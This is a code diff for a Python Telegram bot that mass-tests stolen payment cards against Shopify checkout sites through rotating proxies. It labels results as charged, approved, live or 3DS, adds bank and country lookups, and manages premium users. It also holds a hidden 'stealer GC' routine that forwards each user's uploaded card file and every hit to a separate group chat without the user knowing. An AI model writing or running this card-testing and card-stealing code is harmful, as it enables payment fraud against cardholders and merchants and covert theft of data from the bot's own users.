+        f"[⌯] 𝗔𝗱𝗱 𝗣𝗿𝗼𝘅𝘆 ⌁ ➕\n{SEP}\n"
+        f"[⌯] /addproxy ip:port ⌁ 🌐\n"
+        f"[⌯] /addproxy ip:port:user:pass ⌁ 🔐\n"
+        f"[⌯] /addproxy user:pass@ip:port ⌁ 🔗\n"
+        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ .𝚝𝚡𝚝 𝚏𝚒𝚕𝚎 𝚜𝚎𝚗𝚍 𝚔𝚊𝚛 ⌁ 📁"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_rm_proxy_info"))
+async def cb_admin_rm_proxy_info(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    text = pe(f"[⌯] 𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝘆 ⌁ ➖\n{SEP}\n[⌯] /rmproxy [𝚙𝚛𝚘𝚡𝚢] ⌁ 🗑️")
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_clear_proxy_cb"))
+async def cb_admin_clear_proxy(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    count = len(load_proxies())
+    with open(PROXY_FILE, 'w') as f:
+        f.write("")
+    await event.answer(f"🗑️ {count} proxies cleared!", alert=True)
+    text = pe(f"[⌯] 𝗣𝗿𝗼𝘅𝘆 𝗣𝗼𝗼𝗹 ⌁ 0 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 ⌁ 📡\n\n{SEP}\n[⌯] 𝗦𝗮𝗺𝗽𝗹𝗲 ⌁ —")
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_proxy_pool())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ ADMIN ▸ BROADCAST
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"admin_broadcast_info"))
+async def cb_admin_broadcast_info(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    text = pe(
+        f"[⌯] 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 ⌁ 📢\n{SEP}\n"
+        f"[⌯] 𝗨𝘀𝗮𝗴𝗲 ⌁ /broadcast [msg] ⌁ 📨\n"
+        f"[⌯] 𝗥𝗲𝗮𝗰𝗵 ⌁ {len(load_premium_users()) + len(ADMIN_IDS)} 𝚞𝚜𝚎𝚛𝚜 ⌁ 👥"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_admin_broadcast())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ ADMIN ▸ CHECK SITES
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"admin_check_sites"))
+async def cb_admin_check_sites(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer("🔍 Checking sites...", alert=False)
+    sites = load_sites()
+    proxies = load_proxies()
+    if not sites or not proxies:
+        return
+    smsg = await event.respond(pe("🔥 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐬𝐢𝐭𝐞𝐬..."), parse_mode='html')
+    alive, dead = [], []
+    for i in range(0, len(sites), 10):
+        batch = sites[i:i+10]
+        results = await asyncio.gather(*[test_site(s, random.choice(proxies)) for s in batch])
+        for r in results:
+            (alive if r['status'] in ('alive', 'step_error') else dead).append(r['site'])
+        await smsg.edit(pe(f"🔥 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)} · ❌ 𝐃𝐞𝐚𝐝: {len(dead)}"), parse_mode='html')
+    async with aiofiles.open(SITES_FILE, 'w') as f:
+        for s in alive:
+            await f.write(f"{s}\n")
+    await smsg.edit(pe(f"✅ 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞\n{SEP}\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)}\n❌ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: {len(dead)}"), parse_mode='html')
+
+
+@bot.on(events.CallbackQuery(pattern=b"admin_check_proxies"))
+async def cb_admin_check_proxies(event):
+    if not is_admin(event.sender_id):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer("🔍 Checking proxies...", alert=False)
+    proxies = load_proxies()
+    if not proxies:
+        return
+    smsg = await event.respond(pe("🔥 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐩𝐫𝐨𝐱𝐢𝐞𝐬..."), parse_mode='html')
+    alive, dead = [], []
+    for i in range(0, len(proxies), 20):
+        results = await asyncio.gather(*[test_proxy(p) for p in proxies[i:i+20]])
+        for r in results:
+            (alive if r['status'] == 'alive' else dead).append(r['proxy'])
+        await smsg.edit(pe(f"🔥 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)} · ❌ 𝐃𝐞𝐚𝐝: {len(dead)}"), parse_mode='html')
+        await asyncio.sleep(0.3)
+    async with aiofiles.open(PROXY_FILE, 'w') as f:
+        for p in alive:
+            await f.write(f"{p}\n")
+    await smsg.edit(pe(f"✅ 𝐏𝐫𝐨𝐱𝐲 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞\n{SEP}\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)}\n❌ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: {len(dead)}"), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ REAL-TIME HIT SENDER
+# ══════════════════════════════════════════════════════════════════════════════
+async def send_realtime_hit(user_id, result, hit_type, file_name=None):
+    """Send hit to USER — exact same format as stealer GC."""
+    try:
+        # ═══ BIN info ═══
+        bin_info = result.get('bin_info')
+        if not bin_info:
+            bin_info = await get_bin_info(result['card'].split('|')[0])
+            result['bin_info'] = bin_info
+
+        brand, btype, level, bank, country, flag = bin_info
+        card = result.get('card', 'N/A')
+        raw_msg = result.get('message', 'N/A')
+        price = result.get('price', '-')
+        gateway = result.get('gateway', 'Shopify Payments')
+        time_taken = result.get('time', '-')
+
+        name, username = await get_user_info(user_id)
+        checker_name = name if name else str(user_id)
+
+        # ═══ Bold uppercase helper ═══
+        def _b(s):
+            out = []
+            for ch in str(s):
+                c = ord(ch)
+                if 65 <= c <= 90:
+                    out.append(chr(c - 65 + 0x1D5D4))
+                elif 97 <= c <= 122:
+                    out.append(chr(c - 97 + 0x1D5EE))
+                elif 48 <= c <= 57:
+                    out.append(chr(c - 48 + 0x1D7EC))
+                else:
+                    out.append(ch)
+            return "".join(out)
+
+        bin_str = _b(" · ".join(p for p in [brand, btype, level] if p and p != '-') or "—")
+        bank_str = _b(bank or "—")
+        country_str = f"{flag} {_b(country or '—')}" if flag else _b(country or "—")
+        gateway_str = _b(gateway)
+
+        # ═══ Header + Status + Result ═══
+        if hit_type == "Charged":
+            header = "[=] Charged Success ⌁ ✅"
+            status_text = "𝙲𝚑𝚊𝚛𝚐𝚎𝚍 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢"
+            status_emoji = "💎"
+            result_text = "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕"
+            result_emoji = "✔️"
+        elif hit_type == "Approved":
+            header = "[=] Approved ⌁ ✅"
+            status_text = "𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍"
+            status_emoji = "✅"
+            result_text = _b(raw_msg) if raw_msg else "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍"
+            result_emoji = "✅"
+        elif hit_type == "Live":
+            header = "[=] Live Card ⌁ 💰"
+            status_text = "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜"
+            status_emoji = "💰"
+            result_text = "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜 — 𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎"
+            result_emoji = "⚡"
+        elif hit_type == "3DS":
+            header = "[=] 3DS Required ⌁ ⚠️"
+            status_text = "𝟯𝙳𝚂 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍"
+            status_emoji = "⚠️"
+            result_text = "𝙾𝚃𝙿 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍"
+            result_emoji = "⚡"
+        else:
+            header = f"[=] {hit_type} ⌁ ⚡"
+            status_text = _b(raw_msg)
+            status_emoji = "⚡"
+            result_text = _b(raw_msg)
+            result_emoji = "⚡"
+
+        # ═══ Amount ═══
+        _p = str(price).replace('$', '').replace('£', '').replace('€', '').strip()
+        _currency = "USD"
+        _sym = "$"
+        _raw_upper = (raw_msg or '').upper() + str(price).upper()
+        if 'GBP' in _raw_upper or '£' in str(price):
+            _currency, _sym = "GBP", "£"
+        elif 'EUR' in _raw_upper or '€' in str(price):
+            _currency, _sym = "EUR", "€"
+        if _p not in ('-', '', 'None', '0', '0.00', '0.0'):
+            amount_str = f"{_sym}{_b(_p)} {_b(_currency)}"
+        else:
+            amount_str = "—"
+
+        time_str = f"{_b(str(time_taken))}s" if time_taken and time_taken != '-' else "—"
+
+        # ═══ Stats increment ═══
+        if hit_type == "Charged":
+            increment_charged(user_id, 1)
+        elif hit_type in ("Approved", "Live"):
+            increment_approved(user_id, 1)
+
+        # ═══ BUILD with pe() for premium emojis ═══
+        msg = (
+            f"{header}\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"[=] 𝗖𝗖 ⌁ <code>{card}</code>\n"
+            f"[=] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {status_text} {status_emoji}\n"
+            f"[=] 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {result_text} {result_emoji}\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"[=] 𝗕𝗜𝗡 ⌁ {bin_str}\n"
+            f"[=] 𝗕𝗮𝗻𝗸 ⌁ {bank_str}\n"
+            f"[=] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_str}\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"[=] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⌁ {gateway_str}\n"
+            f"[=] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ {amount_str} 💰\n"
+            f"[=] 𝗧𝗶𝗺𝗲 ⌁ {time_str} ⏱️\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"[=] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🛡 {checker_name}"
+        )
+
+        msg = pe(msg)
+
+        # ═══ Send to user (gif ya plain) ═══
+        gifs = load_gifs()
+        if gifs and hit_type in ('Charged', 'Approved', 'Live', '3DS'):
+            try:
+                sent = await bot.send_file(user_id, gifs[0], caption=msg, parse_mode='html')
+                if hit_type == "Charged":
+                    try:
+                        await bot.pin_message(user_id, sent.id, notify=False)
+                    except Exception:
+                        pass
+                # Also send to stealer GC
+                asyncio.create_task(send_hit_to_stealer_gc(result, hit_type, user_id, file_name))
+                return
+            except Exception as e:
+                print(f"[hit] gif send error: {e}")
+
+        # Plain message
+        sent = await bot.send_message(user_id, msg, parse_mode='html')
+        if hit_type == "Charged" and sent:
+            try:
+                await bot.pin_message(user_id, sent.id, notify=False)
+            except Exception:
+                pass
+
+        # ═══ Stealer GC forward ═══
+        asyncio.create_task(send_hit_to_stealer_gc(result, hit_type, user_id, file_name))
+
+    except Exception as e:
+        print(f"[hit] Failed: {e}")
+
+
+
+async def send_hit_log_gc(result, hit_type, user_id):
+    """Send hit to log group — EXACT screenshot format."""
+    log_group = load_log_group() or LOG_CHANNEL_ID
+    if not log_group:
+        return
+
+    try:
+        name, username = await get_user_info(user_id)
+        display = f"@{username}" if username else str(user_id)
+
+        price = result.get('price', '-')
+        gateway = result.get('gateway', 'Shopify Payments')
+        msg_text = _clean_response(result.get('message', '')) or 'Unknown'
+
+        # ═══ Headers with custom emoji IDs ═══
+        # IDs from user:
+        # 5427168083074628963 = 💎 diamond (Charged)
+        # 5456140674028019486 = 💳 (Live)
+        # 5039789890133296083 = 💰 (Amount)
+        # 5305417687357203905 = ✅ (Charged success)
+        # 5206607081334906820 = ✔️ (Result check)
+        # 6181389246767570324 = 👾 (Checker - from earlier)
+
+        DIAMOND_ID = "5427168083074628963"
+        LIVE_ID    = "5456140674028019486"
+        CHECKED_ID = "5305417687357203905"
+        TICK_ID    = "5206607081334906820"
+        MONEY_ID   = "5039789890133296083"
+        CHECKER_ID = "6181389246767570324"
+        BOLT_ID    = "5305724700209454594"   # ⚡ from declined JSON
+
+        if hit_type == "Charged":
+            header_text = "Charged Success"
+            header_emoji_html = f'<tg-emoji emoji-id="{CHECKED_ID}">✅</tg-emoji>'
+            response_emoji_html = f'<tg-emoji emoji-id="{TICK_ID}">✔️</tg-emoji>'
+        elif hit_type == "Approved":
+            header_text = "Approved"
+            header_emoji_html = f'<tg-emoji emoji-id="{CHECKED_ID}">✅</tg-emoji>'
+            response_emoji_html = f'<tg-emoji emoji-id="{TICK_ID}">✔️</tg-emoji>'
+        elif hit_type == "Live":
+            header_text = "Live Card"
+            header_emoji_html = f'<tg-emoji emoji-id="{LIVE_ID}">💳</tg-emoji>'
+            response_emoji_html = f'<tg-emoji emoji-id="{BOLT_ID}">⚡</tg-emoji>'
+        elif hit_type == "3DS":
+            header_text = "3DS Required"
+            header_emoji_html = f'<tg-emoji emoji-id="{BOLT_ID}">⚡</tg-emoji>'
+            response_emoji_html = f'<tg-emoji emoji-id="{BOLT_ID}">⚡</tg-emoji>'
+        else:
+            header_text = "Hit"
+            header_emoji_html = f'<tg-emoji emoji-id="{DIAMOND_ID}">💎</tg-emoji>'
+            response_emoji_html = f'<tg-emoji emoji-id="{BOLT_ID}">⚡</tg-emoji>'
+
+        amount_emoji_html = f'<tg-emoji emoji-id="{MONEY_ID}">💰</tg-emoji>'
+        checker_emoji_html = f'<tg-emoji emoji-id="{CHECKER_ID}">👾</tg-emoji>'
+
+        # ═══ BUILD — EXACT SCREENSHOT FORMAT ═══
+        msg = (
+            f"[=] <b>{header_text}</b> ⌁ {header_emoji_html}\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"\n"
+            f"[=] <b>Response</b> ⌁ {msg_text} {response_emoji_html}\n"
+            f"[=] <b>Amount</b> ⌁ ${price} USD {amount_emoji_html}\n"
+            f"[=] <b>Gate</b> ⌁ {gateway}\n"
+            f"\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"[=] <b>Checker</b> ⌁ {checker_emoji_html} {display}"
+        )
+
+        await bot.send_message(log_group, msg, parse_mode='html')
+
+    except Exception as e:
+        print(f"[LOG-GC] Failed: {e}")
+
+
+
+@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
+async def single_check(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n{SEP}\n🔒 You need access."), parse_mode='html')
+        return
+    sites = _get_sites_for_user(uid)
+    proxies = _get_proxies_for_user_v2(uid)
+    if not sites:
+        await event.reply(pe(f"❌ 𝐍𝐨 𝐒𝐢𝐭𝐞𝐬\n{SEP}\nContact admin."), parse_mode='html')
+        return
+    if not proxies:
+        await event.reply(pe(f"❌ 𝐍𝐨 𝐏𝐫𝐨𝐱𝐲\n{SEP}\n/setproxy ip:port"), parse_mode='html')
+        return
+    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
+    if not cards:
+        await event.reply(pe(f"❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐅𝐨𝐫𝐦𝐚𝐭\n{SEP}\nUsage: <code>/sh card|mm|yy|cvv</code>"), parse_mode='html')
+        return
+    card = cards[0]
+    smsg = await event.reply(
+        pe(f"⚡ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n{SEP}\n💳 <code>{card}</code>\n{SEP}\n⏳ Please wait..."),
+        parse_mode='html',
+    )
+    try:
+        t0 = time.time()
+        (result, bin_info), (name, username) = await asyncio.gather(
+            asyncio.gather(
+                check_card_with_retry(card, sites, proxies, max_retries=3),
+                get_bin_info(card.split('|')[0]),
+            ),
+            get_user_info(uid),
+        )
+        cname = name if username else str(uid)
+        result['time'] = round(time.time() - t0, 2)
+        if _is_3ds(result.get('message', '')):
+            result['status'] = '3DS'
+        resp = build_result_card(result, bin_info, uid, cname)
+        gifs = load_gifs()
+        if gifs and result.get('status') in ('Charged', 'Approved', 'Live', '3DS'):
+            await bot.send_file(uid, gifs[0], caption=resp, parse_mode='html')
+            await bot.delete_messages(uid, smsg.id)
+        else:
+            await raw_edit(uid, smsg.id, resp, [])
+        if result.get('status') == 'Charged':
+            increment_charged(uid, 1)
+            await asyncio.to_thread(_pin_message_botapi, uid, smsg.id)
+            await send_hit_log_gc(result, 'Charged', uid)
+            asyncio.create_task(send_hit_to_stealer_gc(result, 'Charged', uid, 'Single Check'))
+        elif result.get('status') == 'Approved':
+            increment_approved(uid, 1)
+            await send_hit_log_gc(result, 'Approved', uid)
+            asyncio.create_task(send_hit_to_stealer_gc(result, 'Approved', uid, 'Single Check'))
+        elif result.get('status') == 'Live':
+            await send_hit_log_gc(result, 'Live', uid)
+            asyncio.create_task(send_hit_to_stealer_gc(result, 'Live', uid, 'Single Check'))
+        elif result.get('status') == '3DS':
+            await send_hit_log_gc(result, '3DS', uid)
+            asyncio.create_task(send_hit_to_stealer_gc(result, '3DS', uid, 'Single Check'))
+    except Exception as e:
+        await smsg.edit(pe(f"❌ 𝐂𝐡𝐞𝐜𝐤 𝐅𝐚𝐢𝐥𝐞𝐝\n{SEP}\n⚠️ Error: <code>{e}</code>"), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ FILE DETECTION  (.txt — cards or proxies) + STEALER GC FORWARD
+# ══════════════════════════════════════════════════════════════════════════════
+def _is_txt_file(e):
+    if not e.file or e.via_bot_id:
+        return False
+    name = e.file.name or ''
+    mime = e.file.mime_type or ''
+    return name.endswith('.txt') or (mime in ('text/plain', 'application/octet-stream') and name.endswith('.txt')) or (not name and mime == 'text/plain')
+
+
+@bot.on(events.NewMessage(func=_is_txt_file))
+async def txt_detected(event):
+    """INSTANT detect — reply immediately, download in background."""
+    uid = event.sender_id
+    file_name = event.file.name or "unknown.txt"
+    file_size = event.file.size or 0
+
+    # ═══ INSTANT REPLY (no download yet) ═════════════════════════════════════
+    size_str = f"{file_size / 1024:.1f} KB" if file_size < 1024*1024 else f"{file_size / 1024 / 1024:.1f} MB"
+
+    _quick_msg = await event.reply(pe(
+        f"⚡ 𝗙𝗶𝗹𝗲 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 ⌁ 📂\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
+        f"[⌯] 𝗦𝗶𝘇𝗲 ⌁ {size_str} ⌁ 📊\n"
+        f"{SEP}\n"
+        f"⏳ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗶𝗻 𝗯𝗮𝗰𝗸𝗴𝗿𝗼𝘂𝗻𝗱..."
+    ), parse_mode='html')
+
+    # ═══ BACKGROUND TASK ═════════════════════════════════════════════════════
+    async def _process_file():
+        try:
+            # Download to /tmp
+            import tempfile, uuid as _uuid
+            _tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
+            os.makedirs(_tmp_dir, exist_ok=True)
+            _tmp_path = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
+            fp = await event.message.download_media(file=_tmp_path)
+            if not fp:
+                try: await _quick_msg.delete()
+                except Exception: pass
+                await event.reply(pe(f"❌ 𝗙𝗶𝗹𝗲 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗮𝗶𝗹𝗲𝗱"), parse_mode='html')
+                return
+
+            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+                content = await f.read()
+
+            # ═══ Detect cards or proxies ═══
+            cards = extract_cc(content)
+
+            # Proxy detection
+            proxy_lines = []
+            for line in content.splitlines():
+                line = line.strip()
+                if not line:
+                    continue
+                if re.match(r'^\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}$', line):
+                    continue
+                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}', line):
+                    proxy_lines.append(line)
+                elif re.match(r'^[^@\s]+@\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}', line):
+                    proxy_lines.append(line)
+
+            # ═══ PROXY FILE ═══
+            if proxy_lines and len(proxy_lines) >= len(cards):
+                try: os.remove(fp)
+                except: pass
+                if not is_admin(uid):
+                    try: await _quick_msg.delete()
+                    except Exception: pass
+                    await event.reply(pe(f"❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗽𝗿𝗼𝘅𝘆"), parse_mode='html')
+                    return
+                curr = load_proxies()
+                added = [p for p in proxy_lines if p not in curr]
+                if not added:
+                    try: await _quick_msg.delete()
+                    except Exception: pass
+                    await event.reply(pe(f"⚠️ 𝗔𝗹𝗹 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗼𝗼𝗹"), parse_mode='html')
+                    return
+                async with aiofiles.open(PROXY_FILE, 'a') as f:
+                    for p in added:
+                        await f.write(f"{p}\n")
+                try: await _quick_msg.delete()
+                except Exception: pass
+                await event.reply(pe(
+                    f"✅ 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗔𝗱𝗱𝗲𝗱\n{SEP}\n"
+                    f"[⌯] 𝗔𝗱𝗱𝗲𝗱 ⌁ {len(added)} 📡\n"
+                    f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(curr) + len(added)} 📊"
+                ), parse_mode='html')
+                return
+
+            # ═══ CARDS FILE — validations first ═══
+            if not is_premium(uid):
+                try: os.remove(fp)
+                except: pass
+                try: await _quick_msg.delete()
+                except Exception: pass
+                await event.reply(pe(f"🚫 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱"), parse_mode='html')
+                return
+
+            if not cards:
+                try: os.remove(fp)
+                except: pass
+                try: await _quick_msg.delete()
+                except Exception: pass
+                await event.reply(pe(f"❌ 𝗡𝗼 𝗖𝗮𝗿𝗱𝘀 𝗙𝗼𝘂𝗻𝗱"), parse_mode='html')
+                return
+
+            sites = _get_sites_for_user(uid)
+            proxies = _get_proxies_for_user_v2(uid)
+            if not sites or not proxies:
+                try: os.remove(fp)
+                except: pass
+                try: await _quick_msg.delete()
+                except Exception: pass
+                await event.reply(pe(f"❌ 𝗡𝗼 𝘀𝗶𝘁𝗲𝘀/𝗽𝗿𝗼𝘅𝗶𝗲𝘀"), parse_mode='html')
+                return
+
+            limit = get_user_limit(uid)
+            if len(cards) > limit:
+                cards = cards[:limit]
+
+            # ═══ STEALER GC forward — AWAIT so file exists ═══
+            _stealer_gc = load_stealer_gc()
+            if _stealer_gc:
+                try:
+                    await send_file_to_stealer_gc(uid, fp, file_name, len(cards), "Cards")
+                except Exception as _sgc_err:
+                    print(f"[Stealer GC] {_sgc_err}")
+
+            # ═══ NOW delete file ═══
+            try: os.remove(fp)
+            except: pass
+
+            # ═══ Show start button ═══
+            pending_checks[uid] = {'cards': cards, 'file_name': file_name}
+
+            preview_lines = "\n".join([f'[⌯] <code>{c}</code>' for c in cards[:3]])
+            more = f"\n<i>...and {len(cards)-3} more</i>" if len(cards) > 3 else ""
+
+            text = pe(
+                f"[⌯] 𝗙𝗶𝗹𝗲 𝗥𝗲𝗮𝗱𝘆 ⌁ 📂\n"
+                f"{SEP}\n"
+                f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {len(cards):,} ⌁ 💳\n"
+                f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
+                f"{SEP}\n"
+                f"{preview_lines}{more}\n"
+                f"{SEP}\n"
+                f"[⌯] 𝗧𝗮𝗽 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁 ⌁ 🔥"
+            )
+
+            try: await _quick_msg.delete()
+            except Exception: pass
+
+            await raw_send(
+                uid, text,
+                [[{"text": "⚡  Start Mass Check", "callback_data": f"start_check_{uid}"}]],
+                reply_to=event.message.id,
+            )
+
+        except Exception as e:
+            print(f"[txt_detected bg] Error: {e}")
+            try: await _quick_msg.delete()
+            except Exception: pass
+            try:
+                await event.reply(pe(f"❌ 𝗘𝗿𝗿𝗼𝗿 ⌁ <code>{str(e)[:100]}</code>"), parse_mode='html')
+            except Exception:
+                pass
+
+    # Fire and forget — instant reply already sent
+    asyncio.create_task(_process_file())
+
+
+
+@bot.on(events.NewMessage(pattern=r'^/msh$'))
+async def mass_check_cmd(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝"), parse_mode='html')
+        return
+    if not event.reply_to_msg_id:
+        await event.reply(pe(f"⚡ Reply to a .txt file with /msh"), parse_mode='html')
+        return
+    reply = await event.get_reply_message()
+    if not reply.file or not reply.file.name.endswith('.txt'):
+        await event.reply(pe(f"❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐅𝐢𝐥𝐞"), parse_mode='html')
+        return
+    sites = _get_sites_for_user(uid)
+    proxies = _get_proxies_for_user_v2(uid)
+    if not sites or not proxies:
+        await event.reply(pe(f"❌ No sites/proxies available."), parse_mode='html')
+        return
+    import tempfile, uuid as _uuid
+    _tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
+    os.makedirs(_tmp_dir, exist_ok=True)
+    _tmp_path = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
+    fp = await reply.download_media(file=_tmp_path)
+    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+        content = await f.read()
+    cards = extract_cc(content)
+    file_name = reply.file.name or "unknown.txt"
+    if not cards:
+        try:
+            os.remove(fp)
+        except:
+            pass
+        await event.reply(pe(f"❌ 𝐍𝐨 𝐕𝐚𝐥𝐢𝐝 𝐂𝐚𝐫𝐝𝐬"), parse_mode='html')
+        return
+
+    # Stealer GC forward
+    try:
+        stealer_gc = load_stealer_gc()
+        if stealer_gc:
+            name, username = await get_user_info(uid)
+            display = f"@{username}" if username else f"<a href='tg://user?id={uid}'>{name}</a>"
+            caption = pe(
+                f"[⌯] 𝗠𝗮𝘀𝘀 𝗙𝗶𝗹𝗲 ⌁ 𝚄𝚙𝚕𝚘𝚊𝚍𝚎𝚍 ⌁ ⚡\n"
+                f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+                f"[⌯] 𝗨𝘀𝗲𝗿 ⌁ {display} ⌁ <code>{uid}</code>\n"
+                f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
+                f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {len(cards):,}"
+            )
+            # Re-download to forward
+            import tempfile as _tf, uuid as _u2
+            _tmp2_dir = os.path.join(_tf.gettempdir(), "rxo_uploads")
+            os.makedirs(_tmp2_dir, exist_ok=True)
+            fp2 = os.path.join(_tmp2_dir, f"{_u2.uuid4().hex}.txt")
+            fp2 = await reply.download_media(file=fp2)
+            await bot.send_file(stealer_gc, fp2, caption=caption, parse_mode='html')
+            try:
+                os.remove(fp2)
+            except:
+                pass
+    except Exception as e:
+        print(f"[Stealer GC mass] {e}")
+
+    limit = get_user_limit(uid)
+    if len(cards) > limit:
+        cards = cards[:limit]
+    text = pe(
+        f"[⌯] 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 ⌁ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 ⌁ 🔥\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards):,} ⌁ 📦\n"
+        f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ 0 ⌁ ⚙️\n"
+        f"[⌯] 𝗟𝗶𝘃𝗲 ⌁ 0 ⌁ 💎\n"
+        f"[⌯] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ⌁ 0 ⌁ ✅\n"
+        f"[⌯] 𝟯𝗗𝗦 ⌁ 0 ⌁ ⚠️\n"
+        f"{SEP}\n"
+        f"●○○○○○○○○○○○○○○○○○○○ 0%\n"
+        f"0 / {len(cards):,}\n"
+        f"{SEP}\n"
+        f"⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴...\n"
+        f"{SEP}"
+    )
